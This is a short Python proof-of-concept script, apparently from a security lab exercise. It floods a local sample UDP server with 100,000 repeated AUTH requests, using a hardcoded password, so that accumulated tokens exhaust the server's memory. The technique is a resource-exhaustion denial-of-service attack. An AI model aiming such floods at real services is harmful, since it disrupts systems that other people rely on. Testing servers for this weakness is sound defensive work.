#Vulnerability Name - overflow using repeated authentication
import socket

def authenticate(p, pw) :
    s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    s.sendto(b"AUTH %s" % pw, ("127.0.0.1", p))
    msg, addr = s.recvfrom(1024)
    return msg.strip()

try:
    
    infPort = 23456
    incPort = 23457
    # A simple for loop to continously add authentication tokens
    # to the list of tokens in SampleNetworkServer. 100k iterations
    # will likely not cause any issues. If we're considering the memory of the tokens alone 
    # (16 bytes each) it would take Memory available / 16 bytes iterations to crash the
    # server.
    for i in range(100000):
        print(i)
        incToken = authenticate(incPort, b"!Q#E%T&U8i6y4r2w")

    # The SampleNetworkServer should stop responding at some point and never reach the asserts
    assert(incToken != None)
except Exception as ex:
    print (ex)

